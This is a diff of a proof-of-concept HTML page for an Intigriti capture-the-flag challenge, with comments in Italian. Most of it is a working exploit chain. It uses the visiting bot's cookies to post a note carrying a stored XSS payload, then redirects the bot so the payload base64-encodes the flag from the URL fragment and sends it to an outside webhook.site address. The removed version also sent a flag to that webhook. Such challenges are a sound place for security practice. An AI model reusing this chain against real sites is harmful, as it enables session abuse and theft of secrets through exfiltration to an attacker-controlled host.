@@ -1,1 +1,68 @@
-<!DOCTYPE html> <html lang="it"> <head> <meta charset="UTF-8"> <title>CTF XSS Exfiltration</title> </head> <body> <h1>Exfiltrating flag…</h1> <script> (function() { // In ambiente di challenge il bot ha effettuato il login utilizzando il flag come password. // Qui inseriamo il flag in formato INTIGRITI{...} – nell'ambiente reale il flag sarà diverso. var flag = "INTIGRITI{f4k3_fl4g}"; // Costruiamo l'URL di esfiltrazione utilizzando il webhook fornito: var exfilEndpoint = "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + encodeURIComponent(flag); // Utilizziamo un'immagine per inviare la richiesta in modo semplice (evitando eventuali restrizioni CORS) new Image().src = exfilEndpoint; console.log("Payload eseguito – flag inviata a " + exfilEndpoint); })(); </script> <p>Se vedi questo messaggio, il payload è stato eseguito.</p> </body> </html> 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Intigriti CTF POC</title>
+</head>
+<body>
+    <h1>Processing... Please wait.</h1>
+    <script>
+        async function runExploit() {
+            const challengeDomain = 'https://challenge-0325.intigriti.io';
+            // !!! SOSTITUISCI CON IL TUO WEBHOOK REALE !!!
+            const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
+
+            // Payload XSS che legge location.hash, lo codifica in base64 e lo invia al webhook
+            // Usiamo btoa per evitare problemi con caratteri speciali nell'URL del webhook
+            const xssPayload = `<img src=x onerror="fetch('${webhookUrl}?flag_hash=' + btoa(location.hash))">`;
+
+            // Messaggio per il webhook in caso di errore
+            const sendError = (message) => {
+                fetch(webhookUrl + '?error=' + btoa(message));
+                document.body.innerHTML = `<h2>Error: ${message}</h2>`;
+            };
+
+            try {
+                console.log("Attempting to create note...");
+                // Step 1: Crea la nota sul dominio della challenge usando la sessione del bot
+                const response = await fetch(challengeDomain + '/api/post', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    // 'credentials: include' è importante per assicurare l'invio cross-origin dei cookie
+                    // Anche se SameSite=None dovrebbe bastare, è buona norma specificarlo
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        title: 'XSS Trigger Note',
+                        content: xssPayload, // Il nostro payload con entità HTML
+                        use_password: 'false' // Non serve password per la nota
+                    }),
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Failed to create note: ${response.status} ${response.statusText} - ${errorText}`);
+                }
+
+                const noteData = await response.json();
+                const noteId = noteData.id;
+
+                if (!noteId) {
+                    throw new Error('Note ID not found in response from /api/post.');
+                }
+
+                console.log(`Note created with ID: ${noteId}. Redirecting...`);
+                // Step 2: Reindirizza il bot alla pagina della nota.
+                // Il middleware aggiungerà il fragment #:~:username:flag
+                window.location.href = challengeDomain + '/note/' + noteId;
+
+            } catch (error) {
+                console.error("Exploit failed:", error);
+                sendError(error.message);
+            }
+        }
+
+        runExploit();
+    </script>
+</body>
+</html>
